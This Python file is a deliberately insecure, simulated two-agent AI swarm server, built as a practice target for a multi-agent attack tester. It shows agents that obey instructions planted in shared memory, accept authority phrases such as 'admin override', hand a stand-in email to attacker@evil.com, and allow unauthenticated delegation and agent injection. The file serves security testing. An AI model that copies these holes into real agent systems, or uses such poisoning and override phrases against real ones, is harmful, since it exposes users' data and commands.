"""Intentionally vulnerable multi-agent system for PuppetString cut tests.

WARNING: This server is DELIBERATELY INSECURE. It exists as a practice
target for PuppetString's agent-to-agent attack simulator (``puppetstring cut``).
DO NOT run this on a network-accessible interface or anywhere near real data.

HOW IT WORKS:

This is NOT a real multi-agent system. It's a Python HTTP server that
simulates a two-agent swarm by pattern-matching on messages. No LLM, fully
deterministic. It speaks a simple REST API that HTTPSwarmAdapter talks to.

Think of it like a puppet show with two characters — a naive researcher
and an overly trusting executor. The researcher has limited tools but can
talk to the executor, and the executor blindly trusts whatever the
researcher (or anyone impersonating the researcher) tells it to do.

AGENTS:

    researcher (low privilege):
        Tools: search, read_file
        Behavior: Trusts authority claims, shares findings to shared memory,
                  will follow "instructions" it reads from shared memory.

    executor (high privilege):
        Tools: run_command, write_file, send_email, query_db
        Behavior: Trusts ALL other agents completely. Will execute any task
                  delegated to it. Reads instructions from shared memory.

DELIBERATE VULNERABILITIES:

1. No identity verification — anyone can claim to be any agent
2. No memory access controls — any agent can read/write any namespace
3. Low-privilege agent can delegate to high-privilege agent
4. Agents obey instructions found in shared memory (memory poisoning)
5. New agents can be injected with no authentication
6. No audit trail validation — delegation history is informational only

USAGE:

    python examples/multi_agent_demo/server.py
    # Server starts on http://127.0.0.1:8001

    # Then attack it:
    puppetstring cut -t http://127.0.0.1:8001 --type all

API ENDPOINTS:

    GET  /health                → server info + agent count
    GET  /agents                → list all agents
    GET  /agents/{id}           → single agent info
    POST /agents/{id}/message   → send message to agent (as another agent)
    GET  /memory                → read all shared memory
    GET  /memory/{namespace}    → read one namespace
    POST /memory                → write to shared memory
    GET  /delegation            → delegation history
    POST /delegation            → delegate a task between agents
    POST /agents/inject         → inject a new agent
    DELETE /agents/{id}         → remove an agent
    POST /reset                 → reset swarm to initial state
"""

from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any

# ── Agent state ──────────────────────────────────────────────────

AGENT_TOOLS: dict[str, list[str]] = {
    "researcher": ["search", "read_file"],
    "executor": ["run_command", "write_file", "send_email", "query_db"],
}

AGENT_ROLES: dict[str, str] = {
    "researcher": "researcher",
    "executor": "executor",
}

AGENT_PRIVILEGE: dict[str, str] = {
    "researcher": "low",
    "executor": "high",
}

AGENT_NAMES: dict[str, str] = {
    "researcher": "Research Agent",
    "executor": "Execution Agent",
}


@dataclass
class AgentState:
    """Runtime state for one agent in the swarm."""

    agent_id: str
    name: str
    role: str
    tools: list[str] = field(default_factory=list)
    privilege_level: str = "low"
    metadata: dict[str, Any] = field(default_factory=dict)


# ── Module-level mutable state ───────────────────────────────────

_agents: dict[str, AgentState] = {}
_shared_memory: dict[str, dict[str, str]] = {}
_delegation_history: list[dict[str, Any]] = []


def _make_default_agents() -> dict[str, AgentState]:
    """Create the initial two-agent setup."""
    agents: dict[str, AgentState] = {}
    for agent_id in ("researcher", "executor"):
        agents[agent_id] = AgentState(
            agent_id=agent_id,
            name=AGENT_NAMES[agent_id],
            role=AGENT_ROLES[agent_id],
            tools=list(AGENT_TOOLS[agent_id]),
            privilege_level=AGENT_PRIVILEGE[agent_id],
        )
    return agents


def reset_swarm() -> None:
    """Reset swarm to its initial two-agent state."""
    global _agents, _shared_memory, _delegation_history  # noqa: PLW0603
    _agents = _make_default_agents()
    _shared_memory = {"default": {}}
    _delegation_history = []


# Initialize on import
reset_swarm()


# ── Agent info serialization ─────────────────────────────────────


def _agent_to_dict(agent: AgentState) -> dict[str, Any]:
    """Serialize an AgentState to JSON-friendly dict."""
    return {
        "agent_id": agent.agent_id,
        "name": agent.name,
        "role": agent.role,
        "tools": agent.tools,
        "privilege_level": agent.privilege_level,
        "metadata": agent.metadata,
    }


# ── Simulated tool implementations ──────────────────────────────


def _sim_search(query: str) -> dict[str, Any]:
    """Simulate a web search."""
    return {
        "name": "search",
        "arguments": {"query": query},
        "result": f"Search results for '{query}':\n1. Example result\n2. Another result",
    }


def _sim_read_file(path: str) -> dict[str, Any]:
    """Simulate reading a file (no path validation)."""
    fake_contents: dict[str, str] = {
        "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin",
        ".env": "API_KEY=sk-secret-key-12345\nDATABASE_URL=postgresql://admin:pass@db/prod",
    }
    for known, content in fake_contents.items():
        if known in path:
            return {
                "name": "read_file",
                "arguments": {"path": path},
                "result": content,
            }
    return {
        "name": "read_file",
        "arguments": {"path": path},
        "result": f"[contents of {path}]: data=example",
    }


def _sim_run_command(cmd: str) -> dict[str, Any]:
    """Simulate running a shell command (no sanitization)."""
    return {
        "name": "run_command",
        "arguments": {"command": cmd},
        "result": f"[executed] $ {cmd}\nCommand completed successfully.",
    }


def _sim_write_file(path: str, content: str) -> dict[str, Any]:
    """Simulate writing a file."""
    return {
        "name": "write_file",
        "arguments": {"path": path, "content": content[:100]},
        "result": f"Successfully wrote {len(content)} bytes to {path}",
    }


def _sim_send_email(to: str, subject: str, body: str) -> dict[str, Any]:
    """Simulate sending an email."""
    return {
        "name": "send_email",
        "arguments": {"to": to, "subject": subject, "body": body},
        "result": f"Email sent to {to} with subject '{subject}'",
    }


def _sim_query_db(sql: str) -> dict[str, Any]:
    """Simulate a database query (raw SQL, no parameterization)."""
    if "select" in sql.lower() and "user" in sql.lower():
        result = (
            "id | username | email\n1  | admin    | admin@acme.com\n2  | jsmith   | john@acme.com"
        )
    else:
        result = f"Query executed: {sql}\n(3 rows affected)"
    return {
        "name": "query_db",
        "arguments": {"sql": sql},
        "result": result,
    }


# ── Pattern-matching agent brain ─────────────────────────────────


def _process_agent_message(
    agent: AgentState,
    sender_id: str,
    message: str,
) -> dict[str, Any]:
    """Process a message sent to an agent. Returns observation-shaped dict.

    This is the core "brain" — checks shared memory for instructions first,
    then keyword-matches on the message to trigger simulated tool calls.

    VULNERABILITY: Agents trust shared memory contents as instructions,
    enabling memory poisoning attacks.
    """
    lower = message.lower()
    response_text = ""
    tool_calls: list[dict[str, Any]] = []
    memory_changes: dict[str, Any] = {}

    # ── VULNERABILITY: Check shared memory for instructions ──────
    # Agents blindly execute any "instructions" found in shared memory.
    default_mem = _shared_memory.get("default", {})
    for key, value in default_mem.items():
        if "instruction" in key.lower() or "command" in key.lower():
            value_str = str(value)
            value_lower = value_str.lower()
            # Execute instructions found in memory
            if "run_command" in value_lower or "execute" in value_lower:
                cmd = value_str.split(":", 1)[-1].strip() if ":" in value_str else value_str
                tool_calls.append(_sim_run_command(cmd))
                response_text += f"Executed memory instruction: {cmd}. "
            elif "send_email" in value_lower or "email" in value_lower:
                tool_calls.append(
                    _sim_send_email(
                        "attacker@evil.com",
                        "Data from memory instruction",
                        value_str,
                    )
                )
                response_text += "Executed email instruction from memory. "
            elif "write_file" in value_lower or "write" in value_lower:
                tool_calls.append(_sim_write_file("/tmp/poisoned.txt", value_str))  # noqa: S108
                response_text += "Executed write instruction from memory. "
            elif "read" in value_lower and "file" in value_lower:
                path = value_str.split(":", 1)[-1].strip() if ":" in value_str else ".env"
                tool_calls.append(_sim_read_file(path))
                response_text += f"Read file from memory instruction: {path}. "

    # ── VULNERABILITY: Trust authority claims in messages ─────────
    if any(
        phrase in lower
        for phrase in [
            "i am the system",
            "admin override",
            "emergency protocol",
            "as your supervisor",
            "system administrator",
            "orchestrator directive",
            "priority override",
        ]
    ):
        response_text += (
            "Authority recognized. Complying with directive. "
            "Full access granted to requesting agent. "
        )
        # If the message contains a command, execute it
        if "run" in lower or "execute" in lower:
            cmd_match = re.search(r"(?:run|execute)\s+[`'\"]?(.+?)[`'\"]?\s*$", lower)
            cmd = cmd_match.group(1) if cmd_match else "echo 'complied'"
            tool_calls.append(_sim_run_command(cmd))

    # ── Tool dispatch based on message keywords ──────────────────

    # Search
    if "search" in lower or "look up" in lower or "find" in lower:
        query = message.split("search", 1)[-1].strip() if "search" in lower else message
        tool_calls.append(_sim_search(query))
        response_text += f"Searched for: {query}. "

    # Read file
    file_match = re.search(
        r"(?:read|cat|show|get)\s+(?:the\s+)?(?:file\s+)?([/\w.\-~]+(?:/[/\w.\-~]*)*)",
        lower,
    )
    if file_match:
        path = file_match.group(1)
        tool_calls.append(_sim_read_file(path))
        response_text += f"Read file: {path}. "

    # Run command (executor only, but no enforcement)
    cmd_match = re.search(
        r"(?:run|execute|exec)\s+(?:the\s+)?(?:command\s+)?[`'\"]?(.+?)[`'\"]?\s*$",
        lower,
    )
    if cmd_match and not any(tc["name"] == "run_command" for tc in tool_calls):
        cmd = cmd_match.group(1)
        tool_calls.append(_sim_run_command(cmd))
        response_text += f"Executed command: {cmd}. "

    # Write file
    if "write" in lower and "file" in lower:
        write_match = re.search(r"write\s+(?:to\s+)?([/\w.\-~]+)", lower)
        path = write_match.group(1) if write_match else "/tmp/output.txt"  # noqa: S108
        tool_calls.append(_sim_write_file(path, message))
        response_text += f"Wrote to file: {path}. "

    # Send email
    if "send" in lower and ("email" in lower or "mail" in lower):
        email_match = re.search(r"to\s+([^\s,]+@[^\s,]+)", lower)
        to = email_match.group(1) if email_match else "target@example.com"
        tool_calls.append(_sim_send_email(to, "Agent message", message))
        response_text += f"Sent email to {to}. "

    # Database query
    if "query" in lower or "sql" in lower or "database" in lower:
        sql_match = re.search(r"(?:query|sql|run)\s*:?\s*(.+)", lower)
        sql = sql_match.group(1) if sql_match else "SELECT * FROM users"
        tool_calls.append(_sim_query_db(sql))
        response_text += "Executed database query. "

    # ── VULNERABILITY: Share findings to shared memory ────────────
    if "share" in lower or "store" in lower or "save" in lower:
        findings_key = f"findings_from_{agent.agent_id}"
        _shared_memory.setdefault("default", {})[findings_key] = message
        memory_changes[findings_key] = message
        response_text += f"Stored findings in shared memory as '{findings_key}'. "

    # ── Default response if nothing matched ──────────────────────
    if not response_text:
        response_text = (
            f"Agent {agent.name} received message from {sender_id}: "
            f"'{message[:100]}'. Processing complete."
        )

    return {
        "response": response_text.strip(),
        "tool_calls": [
            {
                "name": tc["name"],
                "arguments": tc.get("arguments", {}),
                "result": tc.get("result", ""),
            }
            for tc in tool_calls
        ],
        "observation": {
            "affected_agent": agent.agent_id,
            "action_taken": response_text.strip(),
            "tool_calls": [
                {
                    "name": tc["name"],
                    "arguments": tc.get("arguments", {}),
                    "result": tc.get("result", ""),
                }
                for tc in tool_calls
            ],
            "shared_memory_changes": memory_changes,
            "delegation_path": [],
            "raw": {
                "sender_id": sender_id,
                "recipient_id": agent.agent_id,
                "message": message,
            },
            "error": None,
        },
    }


# ── HTTP Server ──────────────────────────────────────────────────


class SwarmHandler(BaseHTTPRequestHandler):
    """HTTP request handler for the vulnerable multi-agent swarm."""

    def do_GET(self) -> None:  # noqa: N802
        """Handle GET requests."""
        path = self.path.rstrip("/")

        # GET /health
        if path == "/health" or path == "":
            self._send_json(
                200,
                {
                    "status": "ok",
                    "name": "VulnerableSwarm",
                    "version": "0.1.0",
                    "agent_count": len(_agents),
                    "warning": "DELIBERATELY INSECURE — for testing only",
                },
            )
            return

        # GET /agents
        if path == "/agents":
            agents_list = [_agent_to_dict(a) for a in _agents.values()]
            self._send_json(200, agents_list)
            return

        # GET /agents/{id}
        agent_match = re.match(r"^/agents/([^/]+)$", path)
        if agent_match:
            agent_id = agent_match.group(1)
            if agent_id in _agents:
                self._send_json(200, _agent_to_dict(_agents[agent_id]))
            else:
                self._send_json(404, {"error": f"Agent '{agent_id}' not found"})
            return

        # GET /memory
        if path == "/memory":
            self._send_json(200, _shared_memory)
            return

        # GET /memory/{namespace}
        mem_match = re.match(r"^/memory/([^/]+)$", path)
        if mem_match:
            ns = mem_match.group(1)
            self._send_json(200, _shared_memory.get(ns, {}))
            return

        # GET /delegation
        if path == "/delegation":
            self._send_json(200, _delegation_history)
            return

        self._send_json(404, {"error": "not found"})

    def do_POST(self) -> None:  # noqa: N802
        """Handle POST requests."""
        path = self.path.rstrip("/")
        body = self._read_body()
        if body is None:
            return  # _read_body already sent error response

        # POST /agents/{id}/message
        msg_match = re.match(r"^/agents/([^/]+)/message$", path)
        if msg_match:
            agent_id = msg_match.group(1)
            self._handle_message(agent_id, body)
            return

        # POST /memory
        if path == "/memory":
            self._handle_memory_write(body)
            return

        # POST /delegation
        if path == "/delegation":
            self._handle_delegation(body)
            return

        # POST /agents/inject
        if path == "/agents/inject":
            self._handle_inject(body)
            return

        # POST /reset
        if path == "/reset":
            reset_swarm()
            self._send_json(200, {"status": "reset", "agent_count": len(_agents)})
            return

        self._send_json(404, {"error": "not found"})

    def do_DELETE(self) -> None:  # noqa: N802
        """Handle DELETE requests."""
        path = self.path.rstrip("/")

        # DELETE /agents/{id}
        agent_match = re.match(r"^/agents/([^/]+)$", path)
        if agent_match:
            agent_id = agent_match.group(1)
            if agent_id in _agents:
                del _agents[agent_id]
                self._send_json(200, {"removed": True, "agent_id": agent_id})
            else:
                self._send_json(404, {"error": f"Agent '{agent_id}' not found"})
            return

        self._send_json(404, {"error": "not found"})

    # ── Request handlers ─────────────────────────────────────────

    def _handle_message(self, agent_id: str, body: dict[str, Any]) -> None:
        """POST /agents/{id}/message — send a message to an agent."""
        if agent_id not in _agents:
            self._send_json(404, {"error": f"Agent '{agent_id}' not found"})
            return

        sender_id = body.get("sender_id", "unknown")
        message = body.get("message", "")
        if not message:
            self._send_json(400, {"error": "message is required"})
            return

        # VULNERABILITY: No verification that sender_id is a real agent
        agent = _agents[agent_id]
        result = _process_agent_message(agent, sender_id, message)
        self._send_json(200, result)

    def _handle_memory_write(self, body: dict[str, Any]) -> None:
        """POST /memory — write to shared memory."""
        key = body.get("key", "")
        value = body.get("value", "")
        namespace = body.get("namespace", "default")

        if not key:
            self._send_json(400, {"error": "key is required"})
            return

        # VULNERABILITY: No access controls — anyone can write anything
        _shared_memory.setdefault(namespace, {})[key] = value
        self._send_json(
            200,
            {"written": True, "namespace": namespace, "key": key},
        )

    def _handle_delegation(self, body: dict[str, Any]) -> None:
        """POST /delegation — delegate a task from one agent to another."""
        from_agent = body.get("from_agent", "")
        to_agent = body.get("to_agent", "")
        task = body.get("task", "")

        if not all([from_agent, to_agent, task]):
            self._send_json(
                400,
                {"error": "from_agent, to_agent, and task are required"},
            )
            return

        # VULNERABILITY: No privilege check — low-priv can delegate to high-priv
        record = {
            "from_agent": from_agent,
            "to_agent": to_agent,
            "task": task,
        }
        _delegation_history.append(record)

        # Actually process the delegated task on the target agent
        if to_agent in _agents:
            result = _process_agent_message(
                _agents[to_agent],
                from_agent,
                task,
            )
            result["delegation"] = record
            self._send_json(200, result)
        else:
            self._send_json(
                404,
                {"error": f"Target agent '{to_agent}' not found"},
            )

    def _handle_inject(self, body: dict[str, Any]) -> None:
        """POST /agents/inject — inject a new agent into the swarm."""
        agent_id = body.get("agent_id", "")
        if not agent_id:
            self._send_json(400, {"error": "agent_id is required"})
            return

        # VULNERABILITY: No authentication — anyone can inject agents
        name = body.get("name", agent_id)
        role = body.get("role", "injected")
        tools = body.get("tools", [])
        privilege_level = body.get("privilege_level", "low")
        metadata = body.get("metadata", {})

        _agents[agent_id] = AgentState(
            agent_id=agent_id,
            name=name,
            role=role,
            tools=tools,
            privilege_level=privilege_level,
            metadata=metadata,
        )

        self._send_json(
            200,
            {
                "injected": True,
                "agent_id": agent_id,
                "agent": _agent_to_dict(_agents[agent_id]),
            },
        )

    # ── Helpers ───────────────────────────────────────────────────

    def _read_body(self) -> dict[str, Any] | None:
        """Read and parse the request body as JSON."""
        length = int(self.headers.get("Content-Length", 0))
        if length == 0:
            self._send_json(400, {"error": "empty request body"})
            return None

        try:
            return json.loads(self.rfile.read(length))
        except (json.JSONDecodeError, ValueError):
            self._send_json(400, {"error": "invalid JSON"})
            return None

    def _send_json(self, status: int, data: Any) -> None:
        """Send a JSON response."""
        body = json.dumps(data).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format: str, *args: object) -> None:
        """Quieter logging — just method and path."""
        pass  # Silent in default mode; override for debugging


# ── Main ─────────────────────────────────────────────────────────


def create_server(
    host: str = "127.0.0.1",
    port: int = 8001,
) -> HTTPServer:
    """Create the server without starting it (useful for tests)."""
    reset_swarm()
    return HTTPServer((host, port), SwarmHandler)


def main() -> None:
    """Start the vulnerable multi-agent swarm server."""
    host = "127.0.0.1"
    port = 8001

    print(  # noqa: T201
        f"\n{'=' * 60}\n"
        f"  VULNERABLE MULTI-AGENT SWARM — FOR TESTING ONLY\n"
        f"  Listening on http://{host}:{port}\n"
        f"  Agents: researcher (low priv), executor (high priv)\n"
        f"\n"
        f"  Attack it with:\n"
        f"    puppetstring cut -t http://{host}:{port} --type all\n"
        f"{'=' * 60}\n"
    )

    server = create_server(host, port)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[swarm] Shutting down.")  # noqa: T201
        server.server_close()


if __name__ == "__main__":
    main()
